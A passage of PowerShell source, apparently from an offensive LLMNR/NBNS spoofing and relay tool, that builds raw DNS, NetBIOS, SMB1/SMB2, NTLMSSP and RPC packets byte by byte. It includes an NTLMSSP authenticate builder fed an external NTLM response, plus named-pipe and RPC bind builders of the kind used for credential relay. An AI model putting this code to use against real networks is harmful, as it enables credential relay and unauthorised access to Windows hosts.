{\"{0:X2}\" -f (Get-Random -Minimum $Minimum -Maximum $Maximum)})\n            [Byte[]]$random = $random.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n\n            return $random\n        }\n\n        function New-DNSNameArray\n        {\n            param([String]$Name)\n\n            $character_array = $Name.ToCharArray()\n            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}\n\n            if($index_array.Count -gt 0)\n            {\n\n                $name_start = 0\n\n                foreach($index in $index_array)\n                {\n                    $name_end = $index - $name_start\n                    [Byte[]]$name_array += $name_end\n                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))\n                    $name_start = $index + 1\n                }\n\n                [Byte[]]$name_array += ($Name.Length - $name_start)\n                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))\n            }\n            else\n            {\n                [Byte[]]$name_array = $Name.Length\n                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))\n            }\n\n            return $name_array\n        }\n\n        function New-PacketDNSSOAQuery\n        {\n            param([String]$Name)\n\n            [Byte[]]$type = 0x00,0x06\n            [Byte[]]$name = (New-DNSNameArray $Name) + 0x00\n            [Byte[]]$length = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]\n            [Byte[]]$transaction_ID = New-RandomByteArray 2\n            $DNSQuery = New-Object System.Collections.Specialized.OrderedDictionary\n            $DNSQuery.Add(\"Length\",$length)\n            $DNSQuery.Add(\"TransactionID\",$transaction_ID)\n            $DNSQuery.Add(\"Flags\",[Byte[]](0x01,0x00))\n            $DNSQuery.Add(\"Questions\",[Byte[]](0x00,0x01))\n            $DNSQuery.Add(\"AnswerRRs\",[Byte[]](0x00,0x00))\n            $DNSQuery.Add(\"AuthorityRRs\",[Byte[]](0x00,0x00))\n            $DNSQuery.Add(\"AdditionalRRs\",[Byte[]](0x00,0x00))\n            $DNSQuery.Add(\"Queries_Name\",$name)\n            $DNSQuery.Add(\"Queries_Type\",$type)\n            $DNSQuery.Add(\"Queries_Class\",[Byte[]](0x00,0x01))\n\n            return $DNSQuery\n        }\n\n        $DNS_client = New-Object System.Net.Sockets.TCPClient\n        $DNS_client.Client.ReceiveTimeout = 3000\n\n        try\n        {\n            $DNS_client.Connect($DomainController,\"53\")\n            $DNS_client_stream = $DNS_client.GetStream()\n            $DNS_client_receive = New-Object System.Byte[] 2048\n            $packet_DNSQuery = New-PacketDNSSOAQuery $Zone\n            [Byte[]]$DNS_client_send = ConvertFrom-PacketOrderedDictionary $packet_DNSQuery\n            $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) > $null\n            $DNS_client_stream.Flush()   \n            $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) > $null\n            $DNS_client.Close()\n            $DNS_client_stream.Close()\n\n            if($DNS_client_receive[9] -eq 0)\n            {\n                $inveigh.output_queue.Add(\"[-] $Zone SOA record not found\") > $null\n            }\n            else\n            {\n                $DNS_reply_converted = [System.BitConverter]::ToString($DNS_client_receive)\n                $DNS_reply_converted = $DNS_reply_converted -replace \"-\",\"\"\n                $SOA_answer_index = $DNS_reply_converted.IndexOf(\"C00C00060001\")\n                $SOA_answer_index = $SOA_answer_index / 2\n                $SOA_length = $DNS_client_receive[($SOA_answer_index + 10)..($SOA_answer_index + 11)]\n                $SOA_length = Convert-DataToUInt16 $SOA_length\n                [Byte[]]$SOA_serial_current_array = $DNS_client_receive[($SOA_answer_index + $SOA_length - 8)..($SOA_answer_index + $SOA_length - 5)]\n                $SOA_serial_current = [System.BitConverter]::ToUInt32($SOA_serial_current_array[3..0],0) + 1\n                [Byte[]]$SOA_serial_number_array = [System.BitConverter]::GetBytes($SOA_serial_current)[0..3]\n            }\n\n        }\n        catch\n        {\n            $inveigh.output_queue.Add(\"[-] $DomainController did not respond on TCP port 53\") > $null\n        }\n\n        return [Byte[]]$SOA_serial_number_array\n    }\n\n}\n\n# Packet Functions ScriptBlock\n$packet_functions_scriptblock =\n{\n    function ConvertFrom-PacketOrderedDictionary\n    {\n        param($OrderedDictionary)\n\n        ForEach($field in $OrderedDictionary.Values)\n        {\n            $byte_array += $field\n        }\n\n        return $byte_array\n    }\n\n    function Get-ProcessIDArray\n    {\n        $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id\n        $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))\n        [Byte[]]$process_ID = $process_ID.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n\n        return $process_ID\n    }\n\n\n    #NetBIOS\n\n    function New-PacketNetBIOSSessionService\n    {\n        param([Int]$HeaderLength,[Int]$DataLength)\n    \n        [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]\n    \n        $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary\n        $NetBIOSSessionService.Add(\"MessageType\",[Byte[]](0x00))\n        $NetBIOSSessionService.Add(\"Length\",$length)\n    \n        return $NetBIOSSessionService\n    }\n\n    #SMB1\n\n    function New-PacketSMBHeader\n    {\n        param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)\n    \n        $ProcessID = $ProcessID[0,1]\n    \n        $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMBHeader.Add(\"Protocol\",[Byte[]](0xff,0x53,0x4d,0x42))\n        $SMBHeader.Add(\"Command\",$Command)\n        $SMBHeader.Add(\"ErrorClass\",[Byte[]](0x00))\n        $SMBHeader.Add(\"Reserved\",[Byte[]](0x00))\n        $SMBHeader.Add(\"ErrorCode\",[Byte[]](0x00,0x00))\n        $SMBHeader.Add(\"Flags\",$Flags)\n        $SMBHeader.Add(\"Flags2\",$Flags2)\n        $SMBHeader.Add(\"ProcessIDHigh\",[Byte[]](0x00,0x00))\n        $SMBHeader.Add(\"Signature\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMBHeader.Add(\"Reserved2\",[Byte[]](0x00,0x00))\n        $SMBHeader.Add(\"TreeID\",$TreeID)\n        $SMBHeader.Add(\"ProcessID\",$ProcessID)\n        $SMBHeader.Add(\"UserID\",$UserID)\n        $SMBHeader.Add(\"MultiplexID\",[Byte[]](0x00,0x00))\n    \n        return $SMBHeader\n    }\n    function New-PacketSMBNegotiateProtocolRequest\n    {\n        param([String]$Version)\n    \n        if($Version -eq 'SMB1')\n        {\n            [Byte[]]$byte_count = 0x0c,0x00\n        }\n        else\n        {\n            [Byte[]]$byte_count = 0x22,0x00  \n        }\n    \n        $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMBNegotiateProtocolRequest.Add(\"WordCount\",[Byte[]](0x00))\n        $SMBNegotiateProtocolRequest.Add(\"ByteCount\",$byte_count)\n        $SMBNegotiateProtocolRequest.Add(\"RequestedDialects_Dialect_BufferFormat\",[Byte[]](0x02))\n        $SMBNegotiateProtocolRequest.Add(\"RequestedDialects_Dialect_Name\",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))\n    \n        if($version -ne 'SMB1')\n        {\n            $SMBNegotiateProtocolRequest.Add(\"RequestedDialects_Dialect_BufferFormat2\",[Byte[]](0x02))\n            $SMBNegotiateProtocolRequest.Add(\"RequestedDialects_Dialect_Name2\",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))\n            $SMBNegotiateProtocolRequest.Add(\"RequestedDialects_Dialect_BufferFormat3\",[Byte[]](0x02))\n            $SMBNegotiateProtocolRequest.Add(\"RequestedDialects_Dialect_Name3\",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))\n        }\n    \n        return $SMBNegotiateProtocolRequest\n    }\n    \n    #SMB2\n\n    function New-PacketSMB2Header\n    {\n        param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)\n    \n        if($Signing)\n        {\n            $flags = 0x08,0x00,0x00,0x00      \n        }\n        else\n        {\n            $flags = 0x00,0x00,0x00,0x00\n        }\n    \n        [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)\n    \n        if($message_ID.Length -eq 4)\n        {\n            $message_ID += 0x00,0x00,0x00,0x00\n        }\n    \n        $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2Header.Add(\"ProtocolID\",[Byte[]](0xfe,0x53,0x4d,0x42))\n        $SMB2Header.Add(\"StructureSize\",[Byte[]](0x40,0x00))\n        $SMB2Header.Add(\"CreditCharge\",[Byte[]](0x01,0x00))\n        $SMB2Header.Add(\"ChannelSequence\",[Byte[]](0x00,0x00))\n        $SMB2Header.Add(\"Reserved\",[Byte[]](0x00,0x00))\n        $SMB2Header.Add(\"Command\",$Command)\n        $SMB2Header.Add(\"CreditRequest\",$CreditRequest)\n        $SMB2Header.Add(\"Flags\",$flags)\n        $SMB2Header.Add(\"NextCommand\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2Header.Add(\"MessageID\",$message_ID)\n        $SMB2Header.Add(\"ProcessID\",$ProcessID)\n        $SMB2Header.Add(\"TreeID\",$TreeID)\n        $SMB2Header.Add(\"SessionID\",$SessionID)\n        $SMB2Header.Add(\"Signature\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n    \n        return $SMB2Header\n    }\n    \n    function New-PacketSMB2NegotiateProtocolRequest\n    {\n        $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2NegotiateProtocolRequest.Add(\"StructureSize\",[Byte[]](0x24,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"DialectCount\",[Byte[]](0x02,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"SecurityMode\",[Byte[]](0x01,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"Reserved\",[Byte[]](0x00,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"Capabilities\",[Byte[]](0x40,0x00,0x00,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"ClientGUID\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"NegotiateContextOffset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"NegotiateContextCount\",[Byte[]](0x00,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"Reserved2\",[Byte[]](0x00,0x00))\n        $SMB2NegotiateProtocolRequest.Add(\"Dialect\",[Byte[]](0x02,0x02))\n        $SMB2NegotiateProtocolRequest.Add(\"Dialect2\",[Byte[]](0x10,0x02))\n    \n        return $SMB2NegotiateProtocolRequest\n    }\n    \n    function New-PacketSMB2SessionSetupRequest\n    {\n        param([Byte[]]$SecurityBlob)\n    \n        [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]\n    \n        $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2SessionSetupRequest.Add(\"StructureSize\",[Byte[]](0x19,0x00))\n        $SMB2SessionSetupRequest.Add(\"Flags\",[Byte[]](0x00))\n        $SMB2SessionSetupRequest.Add(\"SecurityMode\",[Byte[]](0x01))\n        $SMB2SessionSetupRequest.Add(\"Capabilities\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2SessionSetupRequest.Add(\"Channel\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2SessionSetupRequest.Add(\"SecurityBufferOffset\",[Byte[]](0x58,0x00))\n        $SMB2SessionSetupRequest.Add(\"SecurityBufferLength\",$security_buffer_length)\n        $SMB2SessionSetupRequest.Add(\"PreviousSessionID\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMB2SessionSetupRequest.Add(\"Buffer\",$SecurityBlob)\n    \n        return $SMB2SessionSetupRequest \n    }\n    \n    function New-PacketSMB2TreeConnectRequest\n    {\n        param([Byte[]]$Buffer)\n    \n        [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]\n    \n        $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2TreeConnectRequest.Add(\"StructureSize\",[Byte[]](0x09,0x00))\n        $SMB2TreeConnectRequest.Add(\"Reserved\",[Byte[]](0x00,0x00))\n        $SMB2TreeConnectRequest.Add(\"PathOffset\",[Byte[]](0x48,0x00))\n        $SMB2TreeConnectRequest.Add(\"PathLength\",$path_length)\n        $SMB2TreeConnectRequest.Add(\"Buffer\",$Buffer)\n    \n        return $SMB2TreeConnectRequest\n    }\n    \n    function New-PacketSMB2CreateRequestFile\n    {\n        param([Byte[]]$NamedPipe)\n    \n        $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]\n    \n        $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2CreateRequestFile.Add(\"StructureSize\",[Byte[]](0x39,0x00))\n        $SMB2CreateRequestFile.Add(\"Flags\",[Byte[]](0x00))\n        $SMB2CreateRequestFile.Add(\"RequestedOplockLevel\",[Byte[]](0x00))\n        $SMB2CreateRequestFile.Add(\"Impersonation\",[Byte[]](0x02,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"SMBCreateFlags\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"Reserved\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"DesiredAccess\",[Byte[]](0x03,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"FileAttributes\",[Byte[]](0x80,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"ShareAccess\",[Byte[]](0x01,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"CreateDisposition\",[Byte[]](0x01,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"CreateOptions\",[Byte[]](0x40,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"NameOffset\",[Byte[]](0x78,0x00))\n        $SMB2CreateRequestFile.Add(\"NameLength\",$name_length)\n        $SMB2CreateRequestFile.Add(\"CreateContextsOffset\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"CreateContextsLength\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2CreateRequestFile.Add(\"Buffer\",$NamedPipe)\n    \n        return $SMB2CreateRequestFile\n    }\n    \n    function New-PacketSMB2ReadRequest\n    {\n        param ([Byte[]]$FileID)\n    \n        $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2ReadRequest.Add(\"StructureSize\",[Byte[]](0x31,0x00))\n        $SMB2ReadRequest.Add(\"Padding\",[Byte[]](0x50))\n        $SMB2ReadRequest.Add(\"Flags\",[Byte[]](0x00))\n        $SMB2ReadRequest.Add(\"Length\",[Byte[]](0x00,0x00,0x10,0x00))\n        $SMB2ReadRequest.Add(\"Offset\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMB2ReadRequest.Add(\"FileID\",$FileID)\n        $SMB2ReadRequest.Add(\"MinimumCount\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2ReadRequest.Add(\"Channel\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2ReadRequest.Add(\"RemainingBytes\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2ReadRequest.Add(\"ReadChannelInfoOffset\",[Byte[]](0x00,0x00))\n        $SMB2ReadRequest.Add(\"ReadChannelInfoLength\",[Byte[]](0x00,0x00))\n        $SMB2ReadRequest.Add(\"Buffer\",[Byte[]](0x30))\n    \n        return $SMB2ReadRequest\n    }\n    \n    function New-PacketSMB2WriteRequest\n    {\n        param([Byte[]]$FileID,[Int]$RPCLength)\n    \n        [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)\n    \n        $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2WriteRequest.Add(\"StructureSize\",[Byte[]](0x31,0x00))\n        $SMB2WriteRequest.Add(\"DataOffset\",[Byte[]](0x70,0x00))\n        $SMB2WriteRequest.Add(\"Length\",$write_length)\n        $SMB2WriteRequest.Add(\"Offset\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $SMB2WriteRequest.Add(\"FileID\",$FileID)\n        $SMB2WriteRequest.Add(\"Channel\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2WriteRequest.Add(\"RemainingBytes\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2WriteRequest.Add(\"WriteChannelInfoOffset\",[Byte[]](0x00,0x00))\n        $SMB2WriteRequest.Add(\"WriteChannelInfoLength\",[Byte[]](0x00,0x00))\n        $SMB2WriteRequest.Add(\"Flags\",[Byte[]](0x00,0x00,0x00,0x00))\n    \n        return $SMB2WriteRequest\n    }\n    \n    function New-PacketSMB2CloseRequest\n    {\n        param ([Byte[]]$FileID)\n    \n        $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2CloseRequest.Add(\"StructureSize\",[Byte[]](0x18,0x00))\n        $SMB2CloseRequest.Add(\"Flags\",[Byte[]](0x00,0x00))\n        $SMB2CloseRequest.Add(\"Reserved\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2CloseRequest.Add(\"FileID\",$FileID)\n    \n        return $SMB2CloseRequest\n    }\n    \n    function New-PacketSMB2TreeDisconnectRequest\n    {\n        $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2TreeDisconnectRequest.Add(\"StructureSize\",[Byte[]](0x04,0x00))\n        $SMB2TreeDisconnectRequest.Add(\"Reserved\",[Byte[]](0x00,0x00))\n    \n        return $SMB2TreeDisconnectRequest\n    }\n    \n    function New-PacketSMB2SessionLogoffRequest\n    {\n        $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2SessionLogoffRequest.Add(\"StructureSize\",[Byte[]](0x04,0x00))\n        $SMB2SessionLogoffRequest.Add(\"Reserved\",[Byte[]](0x00,0x00))\n    \n        return $SMB2SessionLogoffRequest\n    }\n\n    function New-PacketSMB2QueryInfoRequest\n    {\n        param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)\n\n        [Byte[]]$buffer_bytes = ,0x00 * $Buffer\n\n        $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary\n        $SMB2QueryInfoRequest.Add(\"StructureSize\",[Byte[]](0x29,0x00))\n        $SMB2QueryInfoRequest.Add(\"InfoType\",$InfoType)\n        $SMB2QueryInfoRequest.Add(\"FileInfoClass\",$FileInfoClass)\n        $SMB2QueryInfoRequest.Add(\"OutputBufferLength\",$OutputBufferLength)\n        $SMB2QueryInfoRequest.Add(\"InputBufferOffset\",$InputBufferOffset)\n        $SMB2QueryInfoRequest.Add(\"Reserved\",[Byte[]](0x00,0x00))\n        $SMB2QueryInfoRequest.Add(\"InputBufferLength\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2QueryInfoRequest.Add(\"AdditionalInformation\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2QueryInfoRequest.Add(\"Flags\",[Byte[]](0x00,0x00,0x00,0x00))\n        $SMB2QueryInfoRequest.Add(\"FileID\",$FileID)\n\n        if($Buffer -gt 0)\n        {\n            $SMB2QueryInfoRequest.Add(\"Buffer\",$buffer_bytes)\n        }\n\n        return $SMB2QueryInfoRequest\n    }\n\n    function New-PacketSMB2IoctlRequest\n{\n    param([Byte[]]$Function,[Byte[]]$FileName,[Int]$Length,[Int]$OutSize)\n\n    [Byte[]]$indata_length = [System.BitConverter]::GetBytes($Length + 24)\n    [Byte[]]$out_size = [System.BitConverter]::GetBytes($OutSize)\n\n    $SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary\n    $SMB2IoctlRequest.Add(\"StructureSize\",[Byte[]](0x39,0x00))\n    $SMB2IoctlRequest.Add(\"Reserved\",[Byte[]](0x00,0x00))\n    $SMB2IoctlRequest.Add(\"Function\",$Function)\n    $SMB2IoctlRequest.Add(\"GUIDHandle\",$FileName)\n    $SMB2IoctlRequest.Add(\"InData_Offset\",[Byte[]](0x78,0x00,0x00,0x00))\n    $SMB2IoctlRequest.Add(\"InData_Length\",$indata_length)\n    $SMB2IoctlRequest.Add(\"MaxIoctlInSize\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SMB2IoctlRequest.Add(\"OutData_Offset\",[Byte[]](0x78,0x00,0x00,0x00))\n    $SMB2IoctlRequest.Add(\"OutData_Length\",[Byte[]](0x00,0x00,0x00,0x00))\n    $SMB2IoctlRequest.Add(\"MaxIoctlOutSize\",$out_size)\n    $SMB2IoctlRequest.Add(\"Flags\",[Byte[]](0x01,0x00,0x00,0x00))\n    $SMB2IoctlRequest.Add(\"Reserved2\",[Byte[]](0x00,0x00,0x00,0x00))\n\n    if($out_size -eq 40)\n    {\n        $SMB2IoctlRequest.Add(\"InData_Capabilities\",[Byte[]](0x7f,0x00,0x00,0x00))\n        $SMB2IoctlRequest.Add(\"InData_ClientGUID\",[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))\n        $SMB2IoctlRequest.Add(\"InData_SecurityMode\",[Byte[]](0x01))\n        $SMB2IoctlRequest.Add(\"InData_Unknown\",[Byte[]](0x00))\n        $SMB2IoctlRequest.Add(\"InData_DialectCount\",[Byte[]](0x02,0x00))\n        $SMB2IoctlRequest.Add(\"InData_Dialect\",[Byte[]](0x02,0x02))\n        $SMB2IoctlRequest.Add(\"InData_Dialect2\",[Byte[]](0x10,0x02))\n    }\n\n    return $SMB2IoctlRequest\n}\n\n    #NTLM\n\n    function New-PacketNTLMSSPNegotiate\n    {\n        param([Byte[]]$NegotiateFlags,[Byte[]]$Version)\n    \n        [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]\n        [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32\n        [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22\n        [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20\n        [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2\n    \n        $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary\n        $NTLMSSPNegotiate.Add(\"InitialContextTokenID\",[Byte[]](0x60))\n        $NTLMSSPNegotiate.Add(\"InitialcontextTokenLength\",$ASN_length_1)\n        $NTLMSSPNegotiate.Add(\"ThisMechID\",[Byte[]](0x06))\n        $NTLMSSPNegotiate.Add(\"ThisMechLength\",[Byte[]](0x06))\n        $NTLMSSPNegotiate.Add(\"OID\",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))\n        $NTLMSSPNegotiate.Add(\"InnerContextTokenID\",[Byte[]](0xa0))\n        $NTLMSSPNegotiate.Add(\"InnerContextTokenLength\",$ASN_length_2)\n        $NTLMSSPNegotiate.Add(\"InnerContextTokenID2\",[Byte[]](0x30))\n        $NTLMSSPNegotiate.Add(\"InnerContextTokenLength2\",$ASN_length_3)\n        $NTLMSSPNegotiate.Add(\"MechTypesID\",[Byte[]](0xa0))\n        $NTLMSSPNegotiate.Add(\"MechTypesLength\",[Byte[]](0x0e))\n        $NTLMSSPNegotiate.Add(\"MechTypesID2\",[Byte[]](0x30))\n        $NTLMSSPNegotiate.Add(\"MechTypesLength2\",[Byte[]](0x0c))\n        $NTLMSSPNegotiate.Add(\"MechTypesID3\",[Byte[]](0x06))\n        $NTLMSSPNegotiate.Add(\"MechTypesLength3\",[Byte[]](0x0a))\n        $NTLMSSPNegotiate.Add(\"MechType\",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))\n        $NTLMSSPNegotiate.Add(\"MechTokenID\",[Byte[]](0xa2))\n        $NTLMSSPNegotiate.Add(\"MechTokenLength\",$ASN_length_4)\n        $NTLMSSPNegotiate.Add(\"NTLMSSPID\",[Byte[]](0x04))\n        $NTLMSSPNegotiate.Add(\"NTLMSSPLength\",$NTLMSSP_length)\n        $NTLMSSPNegotiate.Add(\"Identifier\",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))\n        $NTLMSSPNegotiate.Add(\"MessageType\",[Byte[]](0x01,0x00,0x00,0x00))\n        $NTLMSSPNegotiate.Add(\"NegotiateFlags\",$NegotiateFlags)\n        $NTLMSSPNegotiate.Add(\"CallingWorkstationDomain\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n        $NTLMSSPNegotiate.Add(\"CallingWorkstationName\",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n    \n        if($Version)\n        {\n            $NTLMSSPNegotiate.Add(\"Version\",$Version)\n        }\n    \n        return $NTLMSSPNegotiate\n    }\n    \n    function New-PacketNTLMSSPAuth\n    {\n        param([Byte[]]$NTLMResponse)\n    \n        [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]\n        [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]\n        [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]\n        [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]\n    \n        $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary\n        $NTLMSSPAuth.Add(\"ASNID\",[Byte[]](0xa1,0x82))\n        $NTLMSSPAuth.Add(\"ASNLength\",$ASN_length_1)\n        $NTLMSSPAuth.Add(\"ASNID2\",[Byte[]](0x30,0x82))\n        $NTLMSSPAuth.Add(\"ASNLength2\",$ASN_length_2)\n        $NTLMSSPAuth.Add(\"ASNID3\",[Byte[]](0xa2,0x82))\n        $NTLMSSPAuth.Add(\"ASNLength3\",$ASN_length_3)\n        $NTLMSSPAuth.Add(\"NTLMSSPID\",[Byte[]](0x04,0x82))\n        $NTLMSSPAuth.Add(\"NTLMSSPLength\",$NTLMSSP_length)\n        $NTLMSSPAuth.Add(\"NTLMResponse\",$NTLMResponse)\n    \n        return $NTLMSSPAuth\n    }\n\n    #RPC\n\n    function New-PacketRPCBind\n    {\n        param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)\n    \n        [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)\n    \n        $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary\n        $RPCBind.Add(\"Version\",[Byte[]](0x05))\n        $RPCBind.Add(\"VersionMinor\",[Byte[]](0x00))\n        $RPCBind.Add(\"PacketType\",[Byte[]](0x0b))\n        $RPCBind.Add(\"PacketFlags\",[Byte[]](0x03))\n        $RPCBind.Add(\"DataRepresentation\",[Byte[]](0x10,0x00,0x00,0x00))\n        $RPCBind.Add(\"FragLength\",$FragLength)\n        $RPCBind.Add(\"AuthLength\",[Byte[]](0x00,0x00))\n        $RPCBind.Add(\"CallID\",$call_ID)\n        $RPCBind.Add(\"MaxXmitFrag\",[Byte[]](0xb8,0x10))\n        $RPCBind.Add(\"MaxRecvFrag\",[Byte[]](0xb8,0x10))\n        $RPCBind.Add(\"AssocGroup\",[Byte[]](0x00,0x00,0x00,0x00))\n        $RPCBind.Add(\"NumCtxItems\",$NumCtxItems)\n        $RPCBind.Add(\"Unknown\",[Byte[]](0x00,0x00,0x00))\n        $RPCBind.Add(\"ContextID\",$ContextID)\n        $RPCBind.Add(\"NumTransItems\",[Byte[]](0x01))\n        $RPCBind.Add(\"Unknown2\",[Byte[]](0x00))\n        $RPCBind.Add(\"Interface\",$UUID)\n        $RPCBind.Add(\"InterfaceVer\",$UUIDVersion)\n        $RPCBind.Add(\"InterfaceVerMinor\",[Byte[]](0x00,0x00))\n        $RPCBind.Add(\"TransferSyntax\",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))\n        $RPCBind.Add(\"TransferSyntaxVer\",[Byte[]](0x02,0x00,0x00,0x00))\n    \n        if($NumCtxItems[0] -eq 2)\n        {\n            $RPCBind.Add(\"ContextID2\",[Byte[]](0x01,0x00))\n            $RPCBind.Add(\"NumTransItems2\",[Byte[]](0x01))\n            $RPCBind.Add(\"Unknown3\",[Byte[]](0x00))\n            $RPCBind.Add(\"Interface2\",$UUID)\n            $RPCBind.Add(\"InterfaceVer2\",$UUIDVersion)\n            $RPCBind.Add(\"InterfaceVerMinor2\",[Byte[]](0x00,0x00))\n            $RPCBind.Add(\"TransferSyntax2\",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))\n            